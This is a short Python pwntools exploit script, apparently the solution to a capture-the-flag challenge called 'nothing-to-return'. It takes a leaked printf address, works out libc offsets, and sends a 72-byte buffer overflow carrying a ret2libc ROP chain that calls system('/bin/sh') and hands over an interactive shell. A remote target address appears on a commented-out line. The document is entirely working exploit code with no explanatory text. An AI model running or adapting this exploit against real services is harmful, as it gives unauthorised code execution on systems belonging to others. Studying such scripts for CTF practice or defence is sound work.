#!/bin/python
from pwn import *
exe = ELF('./nothing-to-return')
LD = ELF('./ld-linux-x86-64.so.2')
LIBC = ELF('./libc.so.6')
# p = remote('34.30.126.104', 5000) 
p = process (exe.path)
context.terminal = ['foot']
gdb.attach(p, gdbscript='''

#b*get_input
           ''')


p.recvuntil(b'printf is at ')
leak_addr = int(p.recvline(), 16)
libc_base = leak_addr -352848
log.info(f'leak_addr: ' + hex(leak_addr))
log.info(f'libc_base: ' + hex(libc_base))
bin_sh_libc = libc_base + 1703476
system_libc = libc_base + 325472 
log.info(f'bin_sh_libc: ' + hex(bin_sh_libc))
log.info(f'system_libc: ' + hex(system_libc))
pop_rdi = libc_base + 0x0000000000028265
log.info(f'pop_rdi: ' + hex(pop_rdi))

p.sendlineafter(b'Input size:',b'1000' )

# p.sendafter(b'size:',b'1000' )
payload = b'A'*72
payload +=  p64(0x00000000004012fb) + p64(pop_rdi) + p64(bin_sh_libc) + p64(system_libc)

p.sendlineafter(b'Enter your input:',payload)

p.interactive()
